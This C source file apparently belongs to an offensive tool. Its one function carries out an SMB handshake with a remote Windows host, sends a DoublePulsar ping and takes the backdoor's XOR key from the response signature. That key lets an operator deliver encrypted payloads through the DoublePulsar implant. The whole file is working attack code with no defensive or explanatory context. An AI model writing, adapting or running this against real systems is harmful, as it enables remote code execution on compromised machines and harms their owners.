#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include "config.h"

extern SOCKET smb_connect(const char *ip, int port);

unsigned int DoublePulsarXORKeyCalculator(const char *ip, int port)
{
    SOCKET sock = INVALID_SOCKET;
    uint8_t *packets[4] = { NULL, NULL, NULL, NULL };
    const uint8_t *sources[4] = {
        SMB_NEGOTIATE_PKT,
        SMB_SESSION_SETUP_PKT,
        SMB_TREE_CONNECT_PKT,
        DP_PING_PKT
    };
    const size_t lengths[4] = {
        sizeof(SMB_NEGOTIATE_PKT) - 1,
        sizeof(SMB_SESSION_SETUP_PKT) - 1,
        sizeof(SMB_TREE_CONNECT_PKT) - 1,
        sizeof(DP_PING_PKT) - 1
    };
    uint8_t user_id[2];
    uint8_t tree_id[2];
    unsigned int result = 0;
    int failed = 0;

    if (ip == NULL || port <= 0 || port > 65535)
        return 0;

    for (size_t i = 0; i < 4; ++i) {
        if (lengths[i] == 0 || lengths[i] > INT_MAX) {
            failed = 1;
            goto cleanup;
        }

        packets[i] = (uint8_t *)malloc(lengths[i]);
        if (packets[i] == NULL) {
            failed = 1;
            goto cleanup;
        }
        memcpy(packets[i], sources[i], lengths[i]);
    }

    sock = smb_connect(ip, port);
    if (sock == INVALID_SOCKET)
        goto cleanup;

    for (size_t stage = 0; stage < 4; ++stage) {
        size_t sent = 0;

        while (sent < lengths[stage]) {
            int amount = (int)(lengths[stage] - sent);
            int count = send(sock, (const char *)packets[stage] + sent, amount, 0);
            if (count <= 0) {
                failed = 1;
                goto cleanup;
            }
            sent += (size_t)count;
        }

        uint8_t header[4];
        size_t received = 0;
        while (received < sizeof(header)) {
            int amount = (int)(sizeof(header) - received);
            int count = recv(sock, (char *)header + received, amount, 0);
            if (count <= 0) {
                failed = 1;
                goto cleanup;
            }
            received += (size_t)count;
        }

        size_t payload_length = ((size_t)header[1] << 16) |
                                ((size_t)header[2] << 8) |
                                (size_t)header[3];
        if (payload_length > SIZE_MAX - sizeof(header)) {
            failed = 1;
            goto cleanup;
        }

        size_t frame_length = sizeof(header) + payload_length;
        uint8_t *frame = (uint8_t *)malloc(frame_length == 0 ? 1 : frame_length);
        if (frame == NULL) {
            failed = 1;
            goto cleanup;
        }
        memcpy(frame, header, sizeof(header));

        received = 0;
        while (received < payload_length) {
            size_t remaining = payload_length - received;
            int amount = remaining > INT_MAX ? INT_MAX : (int)remaining;
            int count = recv(sock, (char *)frame + sizeof(header) + received, amount, 0);
            if (count <= 0) {
                free(frame);
                failed = 1;
                goto cleanup;
            }
            received += (size_t)count;
        }

        if (stage == 1) {
            if (frame_length < 34) {
                free(frame);
                failed = 1;
                goto cleanup;
            }
            memcpy(user_id, frame + 32, sizeof(user_id));
            memcpy(packets[2] + 32, user_id, sizeof(user_id));
        } else if (stage == 2) {
            if (frame_length < 34) {
                free(frame);
                failed = 1;
                goto cleanup;
            }
            memcpy(tree_id, frame + 28, sizeof(tree_id));
            memcpy(packets[3] + 28, tree_id, sizeof(tree_id));
            memcpy(packets[3] + 32, user_id, sizeof(user_id));
        } else if (stage == 3) {
            size_t signature_start = (size_t)SMB_RESP_SIGNATURE_START;
            size_t signature_end = (size_t)SMB_RESP_SIGNATURE_END;
            if (signature_end < signature_start ||
                signature_end - signature_start != 4 ||
                signature_end > frame_length) {
                free(frame);
                failed = 1;
                goto cleanup;
            }
            const uint8_t *b = frame + signature_start;
            result = (unsigned int)b[0] |
                     ((unsigned int)b[1] << 8) |
                     ((unsigned int)b[2] << 16) |
                     ((unsigned int)b[3] << 24);
        }

        free(frame);
    }

cleanup:
    if (sock != INVALID_SOCKET)
        closesocket(sock);
    for (size_t i = 0; i < 4; ++i)
        free(packets[i]);

    return failed ? 0 : result;
}